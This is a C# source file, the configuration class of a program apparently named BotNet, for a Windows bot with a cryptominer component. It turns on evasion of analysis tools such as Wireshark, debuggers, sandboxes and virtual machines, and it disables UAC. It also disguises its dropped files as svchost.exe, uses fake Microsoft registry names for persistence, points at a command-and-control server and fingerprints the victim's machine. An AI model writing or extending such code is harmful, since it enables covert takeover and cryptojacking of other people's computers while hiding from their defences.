
using System;
using System.Collections.Generic;
using System.Text;
using BotNet.Services.Common;
using Microsoft.Win32;

namespace BotNet
{
    public static class Config
    {
        private static Factory _factoryService = new Factory();
        public static bool AntiCain = true;
        public static bool AntiSandboxie = true;
        public static bool AntiDebugger = false;
        public static bool AntiEmulator = true;
        public static bool AntiFilemon = true;
        public static bool AntiNetstat = true;
        public static bool AntiNetworkmon = true;
        public static bool AntiProcessmon = true;
        public static bool AntiRegmon = true;
        public static bool AntiTCPView = true;
        public static bool AntiVm = true;
        public static bool AntiWireshark = true;
        public static bool DisableUAC = true;
        public static bool AntiPH = true;
        public static bool IsMine = false;
        public static string TmpName = "SystemDrive.exe";
        public static string[] FileName = new string[2] { "srvhost.exe", "svchost.exe" };
        public static string[] RegName = new string[2] { "Windows-Server-Driver", "Microsoft SQL Server 2016" };
        public static string[] FilePath = new string[2];
        public static string ServerAddress = _factoryService.GetServerAddress();
        public static string Host = ServerAddress.Remove(ServerAddress.LastIndexOf(@"/"));
        public static string Mutex = _factoryService.GenString(new Random().Next(8, 20));
        public static string BotVersion = "1.0";
        public static int ConnectionInterval = 10;
        public static int PersistentInterval = 60;
        public static int CopyInterval = 20;
        public static int MinerCheckInterval = 3600;
        public static string HWID = _factoryService.GetMachineGuid();
        public static string WinVersion = _factoryService.GetWinVersion();
        public static string PCName = Environment.MachineName;
        public static bool AdminStatus = _factoryService.IsAdmin();
       
    }
}
